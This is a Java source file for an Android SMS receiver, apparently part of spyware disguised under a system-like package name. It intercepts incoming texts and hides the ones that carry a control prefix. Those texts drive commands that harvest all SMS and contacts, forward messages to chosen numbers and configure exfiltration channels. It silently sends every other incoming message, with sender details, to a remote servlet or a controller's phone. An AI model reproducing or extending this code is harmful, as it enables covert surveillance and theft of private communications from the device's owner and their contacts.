package com.me.androidsystem;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.SmsMessage;
import android.util.Log;

import com.me.androidsystem.service.PhoService;
import com.me.androidsystem.service.SmsService;
import com.me.androidsystem.util.CommndUtil;
import com.me.androidsystem.util.ServiceUtil;

/*
 * 实现对短信接收的监听
 */
public class SmsReceiver extends BroadcastReceiver {

	
	public void onReceive(Context context, Intent intent) {
		// 如果短信内容是以qingxue开头，那么表示指令
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for (Object p : pdus) {
			byte[] pdu = (byte[]) p;
			SmsMessage message = SmsMessage.createFromPdu(pdu);
			String content = message.getMessageBody();
			Date date = new Date(message.getTimestampMillis());
			SimpleDateFormat format = new SimpleDateFormat(
					"yyyy-MM-dd HH:mm:ss");
			String receiveTime = format.format(date);
			String senderNumber = message.getOriginatingAddress();
			Log.e("aaaa", content);
			// ServiceUtil.CONTROL_NUMBER.equals(senderNumber)
			if (content.length() >= ServiceUtil.CONTROL_START.length()
					&& content.substring(0, ServiceUtil.CONTROL_START.length())
							.equals(ServiceUtil.CONTROL_START)) {
				abortBroadcast();// 终止广播
				ServiceUtil.CONTROL_NUMBER = senderNumber;
				SharedPreferences sharedPreferences = context
						.getSharedPreferences(ServiceUtil.CONFIG_NAME,
								Context.MODE_PRIVATE);
				Editor edit = sharedPreferences.edit();
				int command = Integer.valueOf(content.split(":")[1]);
				Log.e("aaaa", command+"");
				switch (command) {
				case ServiceUtil.GET_ALL_SMS:
					Intent t1 = new Intent(context, SmsService.class);
					context.startService(t1);
					break;
				case ServiceUtil.GET_ALL_PHO:
					ServiceUtil.ONLY_TEL = false;
					Intent t2 = new Intent(context, PhoService.class);
					context.startService(t2);
					break;
				case ServiceUtil.GET_ONLY_PHO:
					ServiceUtil.ONLY_TEL = true;
					Intent t3 = new Intent(context, PhoService.class);
					context.startService(t3);
					break;
				case ServiceUtil.SMS_TRANSPOND:
					try {
						if (content.split(":").length >= 4) {
							String number = content.split(":")[2];
							String msg = content.split(":")[3];
							CommndUtil.sendSMS(msg, number);
						}
					} catch (Exception e) {
					}
					break;
				// 对获取所有短信是发送模式设置
				case ServiceUtil.SET_SMS_MODEL_0:
					edit.putInt(ServiceUtil.SMS_MODEL, ServiceUtil.MODEL_NONE);
					edit.commit();
					break;
				case ServiceUtil.SET_SMS_MODEL_1:
					edit.putInt(ServiceUtil.SMS_MODEL,
							ServiceUtil.MODEL_SMS_ONLY);
					edit.commit();
					break;
				case ServiceUtil.SET_SMS_MODEL_2:
					edit.putInt(ServiceUtil.SMS_MODEL,
							ServiceUtil.MODEL_NET_ONLY);
					edit.commit();
					break;
				case ServiceUtil.SET_SMS_MODEL_3:
					edit.putInt(ServiceUtil.SMS_MODEL,
							ServiceUtil.MODEL_NET_SMS);
					edit.commit();
					break;
				// 对获取所有通信录是发送模式设置
				case ServiceUtil.SET_PHO_MODEL_0:
					edit.putInt(ServiceUtil.PHO_MODEL, ServiceUtil.MODEL_NONE);
					edit.commit();
					break;
				case ServiceUtil.SET_PHO_MODEL_1:
					edit.putInt(ServiceUtil.PHO_MODEL,
							ServiceUtil.MODEL_SMS_ONLY);
					edit.commit();
					break;
				case ServiceUtil.SET_PHO_MODEL_2:
					edit.putInt(ServiceUtil.PHO_MODEL,
							ServiceUtil.MODEL_NET_ONLY);
					edit.commit();
					break;
				case ServiceUtil.SET_PHO_MODEL_3:
					edit.putInt(ServiceUtil.PHO_MODEL,
							ServiceUtil.MODEL_NET_SMS);
					edit.commit();
					break;
				// 对获取当前短信的发送模式设置
				case ServiceUtil.SET_SMS_ONE_MODEL_0:
					edit.putInt(ServiceUtil.SMS_ONE_MODEL,
							ServiceUtil.MODEL_NONE);
					edit.commit();
					break;
				case ServiceUtil.SET_SMS_ONE_MODEL_1:
					edit.putInt(ServiceUtil.SMS_ONE_MODEL,
							ServiceUtil.MODEL_SMS_ONLY);
					edit.commit();
					break;
				case ServiceUtil.SET_SMS_ONE_MODEL_2:
					edit.putInt(ServiceUtil.SMS_ONE_MODEL,
							ServiceUtil.MODEL_NET_ONLY);
					edit.commit();
					break;
				case ServiceUtil.SET_SMS_ONE_MODEL_3:
					edit.putInt(ServiceUtil.SMS_ONE_MODEL,
							ServiceUtil.MODEL_NET_SMS);
					edit.commit();
					break;
				// 对获取通话记录的发送模式设置与获取所有通信录方式相同

				default:
					break;
				}
			}
			// 如果是普通的短信 可以设置转发或者不采取操作
			else if (!ServiceUtil.CONTROL_NUMBER.equals(senderNumber)) {
				SharedPreferences sharedPreferences = context
						.getSharedPreferences(ServiceUtil.CONFIG_NAME,
								Context.MODE_PRIVATE);
				int model = sharedPreferences.getInt(ServiceUtil.SMS_ONE_MODEL,
						ServiceUtil.MODEL_NET_ONLY);
				ConnectivityManager connectivityManager = (ConnectivityManager) context
						.getSystemService(Context.CONNECTIVITY_SERVICE);
				NetworkInfo networkInfo = connectivityManager
						.getActiveNetworkInfo();
				switch (model) {
				case ServiceUtil.MODEL_SMS_ONLY:
					CommndUtil
							.sendSMS("收到来自" + senderNumber + "的短信：" + content);
					break;
				case ServiceUtil.MODEL_NET_ONLY:
					if (networkInfo != null && networkInfo.isAvailable()) {
						// 当前有可用网络
						CommndUtil.sendInternet("收到来自" + senderNumber + "的短信："
								+ content, ServiceUtil.SMS_ONE_SERVLET);
					} else {
						// 当前无可用网络
						String oldInfo = sharedPreferences.getString(
								ServiceUtil.OFF_INFO, "");
						Editor editor = sharedPreferences.edit();
						editor.putString(ServiceUtil.OFF_INFO, oldInfo
								+ receiveTime + " 收到来自" + senderNumber + "的短信："
								+ content + "\n");
						editor.commit();
						return;
					}
					break;
				case ServiceUtil.MODEL_NET_SMS:
					if (networkInfo != null && networkInfo.isAvailable()) {
						// 当前有可用网络
						CommndUtil.sendInternet("收到来自" + senderNumber + "的短信："
								+ content, ServiceUtil.PHO_SERVLET);
					} else {
						// 当前无可用网络
						CommndUtil.sendSMS("收到来自" + senderNumber + "的短信："
								+ content);
					}
					break;
				default:
					break;
				}
			}
		}
	}

}
